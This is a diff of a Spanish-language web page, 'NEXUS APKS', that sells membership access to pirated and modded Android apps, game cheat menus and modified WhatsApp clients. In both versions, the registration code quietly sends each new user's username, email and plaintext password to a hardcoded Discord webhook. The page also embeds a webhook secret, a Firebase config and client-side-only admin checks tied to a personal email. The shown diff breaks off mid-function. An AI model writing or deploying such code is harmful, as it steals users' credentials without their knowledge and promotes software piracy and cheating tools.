@@ -3,136 +3,407 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS APKS 🌪️</title>
+    <title>NEXUS APKS 🌪️ | PREMIUM MODS</title>
+    
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <style>
-        :root { --p: #00ff88; --s: #1a1a1a; --t: #ffffff; }
-        body { background: #0a0a0a; color: var(--t); font-family: 'Segoe UI', sans-serif; margin: 0; overflow-x: hidden; }
-        
-        /* Intro */
-        #intro { position: fixed; top: 0; width: 100%; height: 100%; background: #000; display: flex; align-items: center; justify-content: center; z-index: 9999; }
-        .glitch { font-size: 3rem; font-weight: bold; color: var(--p); text-shadow: 2px 2px #ff0055; animation: blink 1s infinite; }
-        
-        /* Layout */
-        .header { padding: 20px; text-align: center; background: linear-gradient(180deg, #111, #000); border-bottom: 2px solid var(--p); }
-        .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: #111; }
-        
-        /* Buttons */
-        .btn-green { background: #25d366; color: white; padding: 12px; border-radius: 8px; text-decoration: none; display: block; margin: 10px auto; width: 80%; font-weight: bold; border: none; cursor: pointer; }
-        .btn-premium { background: linear-gradient(45deg, #ffd700, #ffa500); color: #000; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; border: none; }
-        
-        /* Grid APK */
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; padding: 20px; }
-        .card { background: #1a1a1a; border-radius: 12px; overflow: hidden; border: 1px solid #333; transition: 0.3s; position: relative; }
-        .card img { width: 100%; height: 150px; object-fit: cover; }
-        .card-info { padding: 10px; text-align: center; }
-        .card-info h3 { font-size: 0.9rem; margin: 5px 0; }
-        .btn-dl { background: var(--p); color: #000; border: none; padding: 8px; width: 100%; font-weight: bold; cursor: pointer; }
 
-        /* Modales */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; overflow-y: auto; }
-        .modal-content { background: #1a1a1a; margin: 10% auto; padding: 25px; width: 85%; border-radius: 15px; border: 1px solid var(--p); }
-        
-        /* Status & Admin */
-        .status-box { text-align: right; font-size: 0.8rem; }
-        .crown-btn { cursor: pointer; font-size: 1.5rem; background: #222; border-radius: 50%; padding: 5px; border: 1px solid gold; display: none; }
-        
-        /* Auth Forms */
-        .auth-container { padding: 50px 20px; text-align: center; }
-        .input-nexus { width: 90%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 8px; }
-        
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+    <style>
+        /* --- SISTEMA DE DISEÑO NEXUS --- */
+        :root {
+            --primary: #00ff88;
+            --secondary: #1a1a1a;
+            --accent: #ff0055;
+            --gold: #ffd700;
+            --bg: #050505;
+            --text: #ffffff;
+            --card-bg: #111111;
+        }
+
+        * { box-sizing: border-box; transition: all 0.3s ease; }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        /* --- INTRO ANIMADA --- */
+        #intro-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: black;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999;
+        }
+
+        .loader-logo {
+            font-size: 3.5rem;
+            font-weight: 900;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            animation: pulse 1.5s infinite;
+        }
+
+        .loader-bar {
+            width: 200px;
+            height: 4px;
+            background: #222;
+            margin-top: 20px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .loader-progress {
+            width: 0%;
+            height: 100%;
+            background: var(--primary);
+            animation: load 2s forwards;
+        }
+
+        /* --- PANTALLA DE LOGIN/REGISTRO --- */
+        .auth-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .auth-card {
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 20px;
+            border: 1px solid #333;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .auth-card h1 { color: var(--primary); margin-bottom: 10px; }
+
+        .nexus-input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #222;
+            border: 1px solid #444;
+            color: white;
+            border-radius: 10px;
+            outline: none;
+        }
+
+        .nexus-input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0,255,136,0.2); }
+
+        .btn-action {
+            width: 100%;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 10px;
+            border: none;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+        }
+
+        .btn-primary { background: var(--primary); color: black; }
+        .btn-guest { background: #444; color: white; margin-top: 10px; }
+
+        /* --- DASHBOARD PRINCIPAL --- */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 5%;
+            background: rgba(17,17,17,0.95);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid #333;
+        }
+
+        .nav-logo { font-size: 1.5rem; font-weight: bold; color: var(--primary); }
+
+        .status-pill {
+            background: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            border: 1px solid #444;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .crown-icon {
+            font-size: 1.2rem;
+            cursor: pointer;
+            display: none;
+            filter: drop-shadow(0 0 5px gold);
+        }
+
+        /* --- BOTONES DE CABECERA --- */
+        .hero-section {
+            padding: 40px 20px;
+            text-align: center;
+            background: linear-gradient(to bottom, #111, #050505);
+        }
+
+        .btn-whatsapp {
+            background: #25D366;
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(37,211,102,0.3);
+        }
+
+        /* --- GRID DE APKS --- */
+        .apk-container {
+            padding: 20px 5%;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 25px;
+        }
+
+        .apk-card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid #222;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .apk-card:hover { transform: translateY(-10px); border-color: var(--primary); }
+
+        .apk-img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            border-bottom: 1px solid #222;
+        }
+
+        .apk-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--accent);
+            color: white;
+            padding: 2px 8px;
+            border-radius: 5px;
+            font-size: 0.7rem;
+            font-weight: bold;
+        }
+
+        .apk-info { padding: 15px; text-align: center; flex-grow: 1; }
+
+        .apk-info h3 { margin: 0 0 10px 0; font-size: 0.95rem; }
+
+        .btn-download {
+            background: #333;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-download.active { background: var(--primary); color: black; }
+
+        /* --- MODALES --- */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 10000;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .modal-body {
+            background: #151515;
+            max-width: 500px;
+            margin: 50px auto;
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid #333;
+            position: relative;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: #666;
+            cursor: pointer;
+            font-size: 1.5rem;
+        }
+
+        /* --- ANIMACIONES --- */
+        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.98); } }
+        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 600px) {
+            .apk-container { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+            .loader-logo { font-size: 2rem; }
+        }
     </style>
 </head>
 <body>
 
-<div id="intro"><div class="glitch">NEXUS APKS 🌪️</div></div>
+<div id="intro-overlay">
+    <div class="loader-logo">NEXUS APKS 🌪️</div>
+    <div class="loader-bar"><div class="loader-progress"></div></div>
+</div>
 
-<div id="auth-screen" class="auth-container">
-    <h1>NEXUS APKS</h1>
-    <p>Apps Modificadas📁</p>
-    <div id="login-box">
-        <input type="email" id="log-email" class="input-nexus" placeholder="CORREO✉️">
-        <input type="password" id="log-pass" class="input-nexus" placeholder="CONTRASEÑA🔑">
-        <button onclick="login()" class="btn-green" style="background:var(--p); color:#000">INICIAR SESIÓN</button>
-        <button onclick="showRegister()" style="background:none; color:var(--p); border:none; cursor:pointer">¿No tienes cuenta? Regístrate</button>
-        <button onclick="invitado()" class="btn-green" style="background:#555">MODO INVITADO👤</button>
+<div id="auth-screen" class="auth-wrapper">
+    <div class="auth-card" id="login-form">
+        <h1>NEXUS APKS</h1>
+        <p style="color: #888;">Acceso a Apps Modificadas📁</p>
+        
+        <input type="email" id="email-in" class="nexus-input" placeholder="CORREO ELECTRÓNICO✉️">
+        <input type="password" id="pass-in" class="nexus-input" placeholder="CONTRASEÑA🔑">
+        
+        <button class="btn-action btn-primary" onclick="handleLogin()">INICIAR SESIÓN</button>
+        <button class="btn-action btn-guest" onclick="handleGuest()">MODO INVITADO👤</button>
+        
+        <p style="margin-top: 20px; font-size: 0.9rem;">
+            ¿No tienes cuenta? <span style="color: var(--primary); cursor: pointer;" onclick="toggleAuth()">Regístrate aquí</span>
+        </p>
     </div>
-    <div id="reg-box" style="display:none">
-        <input type="text" id="reg-user" class="input-nexus" placeholder="USUARIO👤">
-        <input type="email" id="reg-email" class="input-nexus" placeholder="CORREO✉️">
-        <input type="password" id="reg-pass" class="input-nexus" placeholder="CONTRASEÑA🔑">
-        <button onclick="registrar()" class="btn-green">CREAR CUENTA</button>
-        <button onclick="showLogin()" style="background:none; color:var(--p); border:none; cursor:pointer">Volver al Login</button>
+
+    <div class="auth-card" id="register-form" style="display: none;">
+        <h1>REGISTRO</h1>
+        <input type="text" id="reg-user" class="nexus-input" placeholder="NOMBRE DE USUARIO👤">
+        <input type="email" id="reg-email" class="nexus-input" placeholder="CORREO✉️">
+        <input type="password" id="reg-pass" class="nexus-input" placeholder="CONTRASEÑA🔑">
+        
+        <button class="btn-action btn-primary" onclick="handleRegister()">CREAR CUENTA</button>
+        <button class="btn-action btn-guest" onclick="toggleAuth()">VOLVER AL LOGIN</button>
     </div>
 </div>
 
-<div id="main-content" style="display:none">
-    <div class="top-bar">
-        <button class="btn-premium" onclick="showModal('modal-shop')">COMPRAR 💳</button>
-        <div class="status-box">
-            <span id="admin-icon" class="crown-btn" onclick="showModal('modal-admin')">👑</span>
-            STATUS: <span id="user-status">Cargando...</span>
+<div id="dashboard" style="display: none;">
+    <nav class="navbar">
+        <div class="nav-logo">NEXUS 🌪️</div>
+        <div class="status-pill">
+            <span id="admin-trigger" class="crown-icon" onclick="openModal('admin-modal')">👑</span>
+            <span id="display-status">CARGANDO...</span>
         </div>
-    </div>
+        <button class="btn-premium" style="padding: 8px 15px;" onclick="openModal('shop-modal')">VIP 💳</button>
+    </nav>
 
-    <div class="header">
-        <h1>NEXUS APKS 🌪️</h1>
-        <a href="https://whatsapp.com/channel/0029VbC12x4GufIzNYfrPh3R" class="btn-green">CANAL DE WHATSAPP</a>
-        <button onclick="showModal('modal-terms')" style="background:none; color:orange; border:none; text-decoration:underline; cursor:pointer">TÉRMINOS DE LA WEB🚨</button>
-    </div>
+    <header class="hero-section">
+        <a href="https://whatsapp.com/channel/0029VbC12x4GufIzNYfrPh3R" target="_blank" class="btn-whatsapp">
+            CANAL DE WHATSAPP 📢
+        </a>
+        <br>
+        <button onclick="openModal('terms-modal')" style="color: #ffaa00; background: none; border: none; cursor: pointer; text-decoration: underline;">
+            TÉRMINOS DE LA WEB🚨
+        </button>
+    </header>
 
-    <div class="grid" id="apk-grid"></div>
+    <div class="apk-container" id="apk-list">
+        </div>
+
+    <footer style="text-align: center; padding: 40px; color: #444; font-size: 0.8rem;">
+        &copy; 2026 NEXUS SOFTWORKS | BY CHRISS LORENZO
+    </footer>
 </div>
 
-<div id="modal-terms" class="modal">
-    <div class="modal-content">
-        <h2>TÉRMINOS DE LA PÁGINA 📄 NEXUS APKS</h2>
-        <ul style="text-align:left; line-height: 1.6;">
-            <li>Únete al canal de WhatsApp es importante para avisarte de las nuevas actualizaciones.</li>
-            <li>Debes comprar una membresía (15 o 30 días). Si vence, debes desinstalar los MODs o serás baneado.</li>
-            <li>Al comprar se te dará un tutorial único de instalación.</li>
-        </ul>
-        <button onclick="closeModal('modal-terms')" class="btn-green">ACEPTAR Y CONTINUAR</button>
+<div id="terms-modal" class="modal-overlay">
+    <div class="modal-body">
+        <span class="close-modal" onclick="closeModal('terms-modal')">&times;</span>
+        <h2 style="color: var(--primary);">TÉRMINOS DE LA PÁGINA 📄</h2>
+        <div style="text-align: left; line-height: 1.6; color: #ccc;">
+            <p>1. <b>WhatsApp Plus/GB:</b> Únete al canal de WhatsApp para actualizaciones críticas. Si no actualizas, corres riesgo de suspensión.</p>
+            <p>2. <b>Membresías:</b> Debes adquirir 15 o 30 días. Si vence, desinstala el MOD o tu número será baneado permanentemente de WhatsApp original.</p>
+            <p>3. <b>Soporte:</b> Al comprar se otorga un tutorial único. Consultas extras tienen costo.</p>
+        </div>
+        <button class="btn-action btn-primary" onclick="closeModal('terms-modal')">ACEPTAR Y CONTINUAR</button>
     </div>
 </div>
 
-<div id="modal-shop" class="modal">
-    <div class="modal-content">
-        <div style="border: 2px solid var(--p); padding: 15px; margin-bottom: 20px;">
+<div id="shop-modal" class="modal-overlay">
+    <div class="modal-body" style="text-align: center;">
+        <span class="close-modal" onclick="closeModal('shop-modal')">&times;</span>
+        <h2 style="color: gold;">MEMBRESÍAS PREMIUM 💎</h2>
+        
+        <div style="background: #222; padding: 20px; border-radius: 15px; border: 1px solid var(--primary); margin-bottom: 20px;">
             <h3>15 DÍAS 💎✨</h3>
-            <p>🟢 Acceso a Apps Modificadas<br>🟢 Soporte 24/7<br>🟢 Actualizaciones</p>
-            <button onclick="comprar('15 DÍAS')" class="btn-green">COMPRAR</button>
+            <ul style="text-align: left; font-size: 0.9rem;">
+                <li>✅ Acceso a Apps Modificadas</li>
+                <li>✅ Soporte 24/7</li>
+                <li>✅ Actualizaciones Prioritarias</li>
+            </ul>
+            <button class="btn-action btn-primary" onclick="processPurchase('15 DÍAS')">COMPRAR</button>
         </div>
-        <div style="border: 2px solid gold; padding: 15px;">
+
+        <div style="background: #222; padding: 20px; border-radius: 15px; border: 1px solid gold;">
             <h3>30 DÍAS 💎✨</h3>
-            <p>🟢 Acceso Total<br>🟢 Soporte VIP<br>🟢 Actualizaciones</p>
-            <button onclick="comprar('30 DÍAS')" class="btn-green">COMPRAR</button>
+            <ul style="text-align: left; font-size: 0.9rem;">
+                <li>✅ Todo lo anterior</li>
+                <li>✅ Acceso a Mods Exclusivos</li>
+                <li>✅ Tutorial de Instalación VIP</li>
+            </ul>
+            <button class="btn-action btn-primary" style="background: gold;" onclick="processPurchase('30 DÍAS')">COMPRAR</button>
         </div>
-        <br><button onclick="closeModal('modal-shop')">Cerrar</button>
     </div>
 </div>
 
-<div id="modal-admin" class="modal">
-    <div class="modal-content">
-        <h2>USUARIOS PREMIUM 💎</h2>
-        <input type="email" id="adm-mail" class="input-nexus" placeholder="CORREO✉️">
-        <select id="adm-days" class="input-nexus">
-            <option value="15">15 DÍAS</option>
-            <option value="30">30 DÍAS</option>
-        </select>
-        <button onclick="setPremium()" class="btn-green">OTORGAR PREMIUM 💎</button>
-        <hr>
-        <h3>USUARIOS CON EL PREMIUM 💎</h3>
-        <div id="premium-list"></div>
-        <br><button onclick="closeModal('modal-admin')">Salir</button>
+<div id="admin-modal" class="modal-overlay">
+    <div class="modal-body">
+        <span class="close-modal" onclick="closeModal('admin-modal')">&times;</span>
+        <h2 style="color: gold; text-align: center;">PANEL DE CONTROL 👑</h2>
+        
+        <div style="background: #222; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+            <label>CORREO DEL USUARIO✉️</label>
+            <input type="email" id="adm-target-email" class="nexus-input" placeholder="ejemplo@gmail.com">
+            
+            <label>DURACIÓN</label>
+            <select id="adm-duration" class="nexus-input">
+                <option value="15">15 DÍAS</option>
+                <option value="30">30 DÍAS</option>
+            </select>
+            
+            <button class="btn-action btn-primary" style="background: gold;" onclick="grantPremium()">OTORGAR PREMIUM 💎</button>
+        </div>
+
+        <h3>USUARIOS ACTIVOS</h3>
+        <div id="admin-user-list" style="max-height: 200px; overflow-y: auto; background: #000; padding: 10px; border-radius: 10px;">
+            </div>
     </div>
 </div>
 
 <script>
-    // Configuración Firebase (Usando tus datos confirmados)
+    // --- FIREBASE CONFIGURATION ---
     const firebaseConfig = {
         apiKey: "AIzaSyAzzRWHGhYVFgkWyRwfgNKc5Ql52U4xxM8",
         authDomain: "hyper-drip.firebaseapp.com",
@@ -142,185 +413,107 @@
         appId: "1:1023275797824:web:378ce9a674db72af05fea5",
         databaseURL: "https://hyper-drip-default-rtdb.firebaseio.com"
     };
+
     firebase.initializeApp(firebaseConfig);
     const auth = firebase.auth();
     const db = firebase.database();
-    const webhook = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
 
-    let currentUser = null;
     let isPremium = false;
     let isGuest = false;
 
-    // Lista de APKs
-    const apks = [
-        { n: "CAP CUT PRO", img: "https://i.ibb.co/Nd4ZW59d/images.jpg", link: "https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file", reg: true },
-        { n: "DELTA EXECUTOR", img: "https://i.ibb.co/8g1X87mz/41p-TZNE7m-IL.jpg", link: "https://deltaexploits.gg/delta-executor-android", reg: false },
-        { n: "DTW MOD MENU", img: "https://i.ibb.co/S4w6Cg99/unnamed.png", link: "https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file", reg: false },
-        { n: "GTA SAN ANDREAS", img: "https://i.ibb.co/cSwBjTYM/Capture-d-ecran-2025-12-27-184549.png", link: "https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file", reg: false },
-        { n: "CANVA PRO", img: "https://i.ibb.co/xqQPxmSx/Sin-titulo-1-1.png", link: "https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view", reg: false },
-        { n: "MINECRAFT APK", img: "https://i.ibb.co/pjV6KCT3/images-8.jpg", link: "https://mineckraftapk.com.mx/", reg: false },
-        { n: "Z ARCHIVER PRO", img: "https://i.ibb.co/h6JfhfN/images.png", link: "https://www.mediafire.com/file/tdg8dtny7eiqvwi/Z+Archiver+Pro+v1.0.10+-+espacioapk.com.apk/file", reg: true },
-        { n: "POPPY PLAYTIME 2", img: "https://i.ibb.co/9mN3Fncd/images-1.jpg", link: "https://espacioapk.com/poppy-playtime-chapter-2-apk/", reg: true },
-        { n: "RISE OF EROS +18", img: "https://i.ibb.co/DDsX2VHK/images.jpg", link: "https://www.mediafire.com/file/h0f5t8b2c8n9ch1/Rise+of+Eros+-+espacioapk.com.apk/file", reg: true },
-        { n: "CAR SIMULADOR 2", img: "https://i.ibb.co/Gv8MM5MZ/images-1.webp", link: "https://www.mediafire.com/file/aqtch08hwsuag9a/car+simulator+2+mod+v1.61.4+-+espacioapk.com.apk/file", reg: true },
-        { n: "BLOOD STRIKE MENU", img: "https://i.ibb.co/ynfPjpTS/hqdefault.jpg", link: "https://www.mediafire.com/file/sg548qen5fa1cea/FREE_MOD_BY_KYKYR_CHEATZ.apk/file", reg: true },
-        { n: "GB WHATSAPP EXTREME", img: "https://i.ibb.co/bj16Q1H3/favicon.png", link: "https://www.mediafire.com/file/e2yrwtq46ab16h1/GBEXTREME_MAS_V26.36E.apk/file", reg: false, vip: true },
-        { n: "MB WHATSAPP PLUS", img: "https://i.ibb.co/rGCqw4DX/Whatsapp-plus-logo-2.webp", link: "https://www.mediafire.com/file/yfosnqs5lkb7vfl/MBWhatsApp_2.8.0F_by_stefanoYG.apk/file", reg: false, vip: true },
-        { n: "GB WHATSAPP PRO", img: "https://i.ibb.co/bj16Q1H3/favicon.png", link: "https://www.mediafire.com/file/ijzc5qggle2v1yf/G.B-Whats4pp_PR0_v26.36.apk/file", reg: false, vip: true }
+    // --- APK DATABASE ---
+    const APK_DATA = [
+        { name: "CAP CUT PRO", img: "https://i.ibb.co/Nd4ZW59d/images.jpg", link: "https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file", guest: true },
+        { name: "DELTA EXECUTOR", img: "https://i.ibb.co/8g1X87mz/41p-TZNE7m-IL.jpg", link: "https://deltaexploits.gg/delta-executor-android", guest: false },
+        { name: "DTW MOD MENU", img: "https://i.ibb.co/S4w6Cg99/unnamed.png", link: "https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file", guest: false },
+        { name: "GTA SAN ANDREAS", img: "https://i.ibb.co/cSwBjTYM/Capture-d-ecran-2025-12-27-184549.png", link: "https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file", guest: false },
+        { name: "CANVA PRO", img: "https://i.ibb.co/xqQPxmSx/Sin-titulo-1-1.png", link: "https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view", guest: false },
+        { name: "MINECRAFT APK", img: "https://i.ibb.co/pjV6KCT3/images-8.jpg", link: "https://mineckraftapk.com.mx/", guest: false },
+        { name: "Z ARCHIVER PRO", img: "https://i.ibb.co/h6JfhfN/images.png", link: "https://www.mediafire.com/file/tdg8dtny7eiqvwi/Z+Archiver+Pro+v1.0.10+-+espacioapk.com.apk/file", guest: true },
+        { name: "POPPY PLAYTIME 2", img: "https://i.ibb.co/9mN3Fncd/images-1.jpg", link: "https://espacioapk.com/poppy-playtime-chapter-2-apk/", guest: true },
+        { name: "GEOMETRY DASH", img: "https://i.ibb.co/fY91dp14/images-2.jpg", link: "https://espacioapk.com/geometry-dash-apk/", guest: false },
+        { name: "RISE OF EROS +18", img: "https://i.ibb.co/DDsX2VHK/images.jpg", link: "https://www.mediafire.com/file/h0f5t8b2c8n9ch1/Rise+of+Eros+-+espacioapk.com.apk/file", guest: true },
+        { name: "BLOOD STRIKE MOD", img: "https://i.ibb.co/ynfPjpTS/hqdefault.jpg", link: "https://www.mediafire.com/file/sg548qen5fa1cea/FREE_MOD_BY_KYKYR_CHEATZ.apk/file", guest: true },
+        { name: "GB WHATSAPP EXTREME", img: "https://i.ibb.co/bj16Q1H3/favicon.png", link: "https://www.mediafire.com/file/e2yrwtq46ab16h1/GBEXTREME_MAS_V26.36E.apk/file", premium: true },
+        { name: "MB WHATSAPP PLUS", img: "https://i.ibb.co/rGCqw4DX/Whatsapp-plus-logo-2.webp", link: "https://www.mediafire.com/file/yfosnqs5lkb7vfl/MBWhatsApp_2.8.0F_by_stefanoYG.apk/file", premium: true },
+        { name: "GB WHATSAPP PRO", img: "https://i.ibb.co/bj16Q1H3/favicon.png", link: "https://www.mediafire.com/file/ijzc5qggle2v1yf/G.B-Whats4pp_PR0_v26.36.apk/file", premium: true }
     ];
 
-    // Auto Login & Intro
-    window.onload = () => {
+    // --- INITIALIZATION ---
+    window.addEventListener('load', () => {
         setTimeout(() => {
-            document.getElementById('intro').style.display = 'none';
+            document.getElementById('intro-overlay').style.opacity = '0';
+            setTimeout(() => document.getElementById('intro-overlay').remove(), 500);
+            
+            // Auto-login Check
             auth.onAuthStateChanged(user => {
-                if (user) {
-                    currentUser = user;
-                    entrarDashboard();
-                }
+                if (user) setupUserSession(user);
             });
-        }, 2500);
-    };
+        }, 2000);
+    });
 
-    function showRegister() { document.getElementById('login-box').style.display='none'; document.getElementById('reg-box').style.display='block'; }
-    function showLogin() { document.getElementById('login-box').style.display='block'; document.getElementById('reg-box').style.display='none'; }
-
-    // Registro
-    async function registrar() {
-        const u = document.getElementById('reg-user').value;
-        const e = document.getElementById('reg-email').value;
-        const p = document.getElementById('reg-pass').value;
-        try {
-            await auth.createUserWithEmailAndPassword(e, p);
-            sendDiscord(`🆕 **NUEVO REGISTRO**\n👤 Usuario: ${u}\n✉️ Correo: ${e}\n🔑 Clave: ${p}`);
-            alert("Cuenta creada con éxito");
-        } catch(err) { alert(err.message); }
+    // --- AUTH LOGIC ---
+    function toggleAuth() {
+        const login = document.getElementById('login-form');
+        const register = document.getElementById('register-form');
+        login.style.display = login.style.display === 'none' ? 'block' : 'none';
+        register.style.display = register.style.display === 'none' ? 'block' : 'none';
     }
 
-    // Login
-    async function login() {
-        const e = document.getElementById('log-email').value;
-        const p = document.getElementById('log-pass').value;
-        try { await auth.signInWithEmailAndPassword(e, p); } catch(err) { alert("Error: " + err.message); }
-    }
-
-    function invitado() { isGuest = true; entrarDashboard(); }
-
-    function entrarDashboard() {
-        document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('main-content').style.display = 'block';
-        checkStatus();
-        renderApks();
-    }
-
-    function checkStatus() {
-        if(isGuest) {
-            document.getElementById('user-status').innerHTML = "FREE👤";
-            return;
-        }
-        const email = auth.currentUser.email;
-        // Check Admin
-        if(email === "chrisslorenzohdz@gmail.com") {
-            document.getElementById('admin-icon').style.display = 'inline-block';
-            document.getElementById('user-status').innerHTML = "ADMIN 👑";
-            loadPremiumList();
-        }
-        // Check Premium en DB
-        db.ref('premium/' + email.replace(/\./g, '_')).on('value', snap => {
-            if(snap.val() && snap.val().active) {
-                isPremium = true;
-                document.getElementById('user-status').innerHTML = "PREMIUM 💎";
-            } else if(email !== "chrisslorenzohdz@gmail.com") {
-                isPremium = false;
-                document.getElementById('user-status').innerHTML = "FREE👤";
-            }
-        });
-    }
-
-    function renderApks() {
-        const grid = document.getElementById('apk-grid');
-        grid.innerHTML = "";
-        apks.forEach(apk => {
-            const card = document.createElement('div');
-            card.className = "card";
-            card.innerHTML = `
-                <img src="${apk.img}">
-                <div class="card-info">
-                    <h3>${apk.n}</h3>
-                    <button class="btn-dl" onclick="descargar('${apk.link}', ${apk.reg}, ${apk.vip || false})">DESCARGAR</button>
-                </div>
-            `;
-            grid.appendChild(card);
-        });
-    }
-
-    function descargar(link, reg, vip) {
-        if(isGuest) {
-            if(reg) { window.open(link, '_blank'); }
-            else { alert("¡HAZTE VIP Y REGÍSTRATE✨!"); showModal('modal-shop'); }
-            return;
-        }
-        if(vip && !isPremium && auth.currentUser.email !== "chrisslorenzohdz@gmail.com") {
-            alert("ESTA APP ES SOLO PARA PREMIUM 💎");
-            showModal('modal-shop');
-            return;
-        }
-        window.open(link, '_blank');
-    }
-
-    // Admin Logic
-    function setPremium() {
-        const email = document.getElementById('adm-mail').value;
-        const days = document.getElementById('adm-days').value;
-        if(!email) return alert("Pon un correo");
+    async function handleLogin() {
+        const email = document.getElementById('email-in').value;
+        const pass = document.getElementById('pass-in').value;
+        if (!email || !pass) return alert("Completa los campos");
         
-        db.ref('premium/' + email.replace(/\./g, '_')).set({
-            active: true,
-            days: days,
-            date: new Date().toLocaleDateString()
-        }).then(() => {
-            alert("LISTO ✅ Premium otorgado a " + email);
+        try {
+            await auth.signInWithEmailAndPassword(email, pass);
+        } catch (e) { alert("Error: " + e.message); }
+    }
+
+    async function handleRegister() {
+        const user = document.getElementById('reg-user').value;
+        const email = document.getElementById('reg-email').value;
+        const pass = document.getElementById('reg-pass').value;
+        
+        if (!user || !email || !pass) return alert("Completa todos los datos");
+
+        try {
+            await auth.createUserWithEmailAndPassword(email, pass);
+            // Webhook Notify
+            sendToDiscord(`🆕 **NUEVO USUARIO**\n👤: ${user}\n✉️: ${email}\n🔑: ${pass}`);
+            alert("¡Registro exitoso!");
+        } catch (e) { alert(e.message); }
+    }
+
+    function handleGuest() {
+        isGuest = true;
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        updateUI();
+    }
+
+    function setupUserSession(user) {
+        isGuest = false;
+        document.getElementById('auth-screen').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        
+        // Admin Check
+        if (user.email === "chrisslorenzohdz@gmail.com") {
+            document.getElementById('admin-trigger').style.display = 'block';
+            loadAdminPanel();
+        }
+        
+        // Premium Watcher
+        const safeEmail = user.email.replace(/\./g, '_');
+        db.ref(`premium_users/${safeEmail}`).on('value', snap => {
+            isPremium = snap.exists() && snap.val().active;
+            updateUI();
         });
     }
 
-    function loadPremiumList() {
-        db.ref('premium').on('value', snap => {
-            const list = document.getElementById('premium-list');
-            list.innerHTML = "";
-            snap.forEach(child => {
-                const data = child.val();
